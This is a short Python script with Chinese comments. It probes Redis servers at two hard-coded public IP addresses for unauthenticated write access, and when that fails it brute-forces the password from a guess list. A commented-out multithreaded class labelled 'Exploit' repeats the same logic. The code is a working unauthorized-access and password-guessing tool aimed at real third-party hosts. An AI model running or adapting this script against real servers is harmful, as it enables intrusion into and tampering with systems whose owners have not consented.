# coding:utf-8
'''
如果redis没设置密码，r.set('name', 'test')可以成功设置，通过r.get('name')可以取出
如果设置了密码，不传递password则返回NOAUTH Authentication required.
传递密码但错误返回invalid password
密码正确成功写入值
149.28.42.95 有密码
207.246.87.203 无密码
'''
# coding:utf-8
import redis
# import threading
# from Libs.methods import *
# from Libs.glo import *
#
# event = getThrEvent()           # 获取线程事件
# event.set()
# q = getQueue()                          #队列必须使用多进程的队列，使用queue模块会报错
#
# #自定义多线程类
# class Exploit(threading.Thread):
#     def __init__(self, ip, port, q_pwd):
#         threading.Thread.__init__(self)
#         self.ip = ip
#         self.port = port
#         self.q_pwd = q_pwd           # 获取密码
#
#     def run(self):
#         while event.is_set():
#             if self.q_pwd.empty():
#                 break
#             else:
#                 pwd = self.q_pwd.get()
#                 try:
#                     r = redis.Redis(host=ip, port=6379)
#                     r.set('name', 'test')
#                     break
#                 except Exception as e:
#                     flag = 1
#                     while flag:
#                         for pwd in passwords:
#                             try:
#                                 r = redis.Redis(host=ip, port=6379, password=pwd)
#                                 r.set('name', 'test')
#                                 print(pwd)
#                                 flag = 0
#                                 break
#                             except Exception as e:
#                                 print(e)
#                         flag = 0



ip = '207.246.87.203'
passwords = ['a', 'b', '123456', '789']
try:
    r = redis.Redis(host=ip, port=6379)
    r.set('name', 'test')
    print(r.get('name'))
except Exception as e:
    flag = 1
    while flag:
        for pwd in passwords:
            try:
                r = redis.Redis(host=ip, port=6379, password=pwd)
                r.set('name', 'test')
                print(pwd)
                flag = 0
                break
            except Exception as e:
                print(e)
        flag = 0